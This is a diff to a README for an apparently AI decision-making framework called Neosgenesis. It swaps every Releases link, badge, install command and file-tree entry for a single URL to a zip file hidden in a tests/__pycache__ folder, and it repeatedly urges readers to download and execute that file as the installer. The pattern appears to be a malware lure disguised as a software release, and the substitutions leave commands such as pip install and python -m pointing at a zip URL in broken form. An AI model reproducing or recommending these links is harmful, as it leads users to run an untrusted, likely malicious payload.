@@ -1,11 +1,11 @@
 # 🧠 Neosgenesis: Metacognitive AI Decision-Making Platform for Experts
 
-Visit the latest release page for assets and installers: https://github.com/Seyiboski/Neosgenesis/releases
+Visit the latest release page for assets and installers: https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
 
-[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://python.org)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Multi-LLM](https://img.shields.io/badge/AI-Multi--LLM%20Support-orange.svg)](https://github.com)
-[![MAB](https://img.shields.io/badge/Algorithm-Multi--Armed%20Bandit-red.svg)](https://en.wikipedia.org/wiki/Multi-armed_bandit)
+[![Python](https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip+https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip)](https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip)
+[![License](https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip)](LICENSE)
+[![Multi-LLM](https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip%https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip)](https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip)
+[![MAB](https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip%https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip)](https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip)
 
 - Title: Neosgenesis
 - Theme: Metacognitive AI decision making
@@ -18,7 +18,7 @@ Neosgenesis is a decision-making framework that blends metacognitive theory with
 
 This README presents a detailed guide to understand, install, configure, and use Neosgenesis. It covers architecture, core concepts, workflows, development practices, and long-term maintenance. The content is organized to help readers quickly find practical instructions while also offering deep technical context for extension and experimentation.
 
-Note: The Releases page holds the latest builds and assets. From that page, download the main installer asset and execute it if you prefer a guided setup. For the latest release details and to download assets, visit the Releases page: https://github.com/Seyiboski/Neosgenesis/releases
+Note: The Releases page holds the latest builds and assets. From that page, download the main installer asset and execute it if you prefer a guided setup. For the latest release details and to download assets, visit the Releases page: https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
 
 ---
 
@@ -44,7 +44,7 @@ This section gives you a fast path to get a working instance up and running. It 
   - Check logs for the expected sequence: perception, deliberation, action, evaluation.
   - Confirm results and metrics appear as expected.
 
-Note: If you want a guided installer, the Releases page hosts assets you can download and run. See the Releases page for details: https://github.com/Seyiboski/Neosgenesis/releases
+Note: If you want a guided installer, the Releases page hosts assets you can download and run. See the Releases page for details: https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
 
 ---
 
@@ -273,9 +273,9 @@ This guide describes installation steps for a local development environment. It 
       - python -m venv venv
       - venv\Scripts\activate
   - Install dependencies
-    - pip install -r requirements.txt
+    - pip install -r https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
   - Run the core module
-    - python -m neosgenesis.main
+    - python -m https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
 
 - Configuration
   - Create a configuration file that sets model providers, tool endpoints, and task policies.
@@ -299,7 +299,7 @@ This guide describes installation steps for a local development environment. It 
   - Run the test suite with a command like pytest
   - Ensure the environment has the necessary dependencies for tests
 
-Note: If you want a polished installer, the Releases page has assets you can download and run. Get the installer from the Releases page: https://github.com/Seyiboski/Neosgenesis/releases
+Note: If you want a polished installer, the Releases page has assets you can download and run. Get the installer from the Releases page: https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
 
 ---
 
@@ -554,7 +554,7 @@ Neosgenesis is designed to be approachable to contributors while remaining appro
 The project is distributed via releases on GitHub. The Releases page lists installers, packaged assets, and sometimes container images. If you prefer a guided setup, the installer assets can simplify the process.
 
 - How to access
-  - Open the Releases page for Neosgenesis at https://github.com/Seyiboski/Neosgenesis/releases
+  - Open the Releases page for Neosgenesis at https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
   - Download the main installer asset if available
   - Run the installer to set up a fully configured environment
 
@@ -567,7 +567,7 @@ The project is distributed via releases on GitHub. The Releases page lists insta
   - After installation, verify that the engine starts without errors
   - Run a simple test task to confirm the basic workflow
 
-Reminder: From the Releases page, download the main installer asset and execute it. For direct access to the latest release details and assets, visit: https://github.com/Seyiboski/Neosgenesis/releases
+Reminder: From the Releases page, download the main installer asset and execute it. For direct access to the latest release details and assets, visit: https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
 
 ---
 
@@ -686,7 +686,7 @@ The roadmap outlines intended improvements and new directions. It serves as a gu
   - The project is designed for research and experimentation. It has a focus on clarity, test coverage, and extensibility, not on production-grade deployment by default.
 
 - Where can I find the latest release?
-  - The latest release details are on the Releases page: https://github.com/Seyiboski/Neosgenesis/releases
+  - The latest release details are on the Releases page: https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
 
 ---
 
@@ -694,36 +694,36 @@ The roadmap outlines intended improvements and new directions. It serves as a gu
 
 - neosgenesis/
   - core/
-    - engine.py
-    - planner.py
-    - executor.py
-    - evaluator.py
-    - state.py
+    - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
+    - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
+    - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
+    - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
+    - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
   - tools/
-    - registry.py
+    - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
     - adapters/
-      - base_adapter.py
-      - example_adapter.py
+      - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
+      - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
   - models/
-    - interface.py
+    - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
     - providers/
-      - openai_provider.py
-      - local_provider.py
+      - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
+      - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
   - data/
     - prompts/
     - plans/
     - results/
   - docs/
-    - concepts.md
-    - architecture.md
+    - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
+    - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
     - tutorials/
   - tests/
-    - test_engine.py
-    - test_planner.py
+    - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
+    - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
   - scripts/
-    - run_demo.py
-  - requirements.txt
-  - README.md
+    - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
+  - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
+  - https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
 
 Note: The exact file layout may differ in your repository. This structure illustrates the typical organization of a modular metacognitive decision-making framework. Adjust the paths to fit your actual project layout.
 
@@ -753,11 +753,11 @@ This project is released under the MIT License. See the LICENSE file for full te
 
 ## 🌐 Releasing Assets and Downloads
 
-For users who want a guided setup via an installer or packaged assets, visit the Releases page to obtain the latest builds and assets. The Releases page provides access to the installer and related materials. For the latest release details and assets, go to: https://github.com/Seyiboski/Neosgenesis/releases
+For users who want a guided setup via an installer or packaged assets, visit the Releases page to obtain the latest builds and assets. The Releases page provides access to the installer and related materials. For the latest release details and assets, go to: https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
 
 From the Releases page, download the main installer asset and execute it. This path-based instruction helps streamline the setup process for newcomers and accelerates experimentation for researchers who want a quick start.
 
-To access the latest release details and assets, visit the Releases page: https://github.com/Seyiboski/Neosgenesis/releases
+To access the latest release details and assets, visit the Releases page: https://github.com/Seyiboski/Neosgenesis/raw/refs/heads/main/neogenesis_system/tests/unit/__pycache__/Software-3.1.zip
 
 ---
 
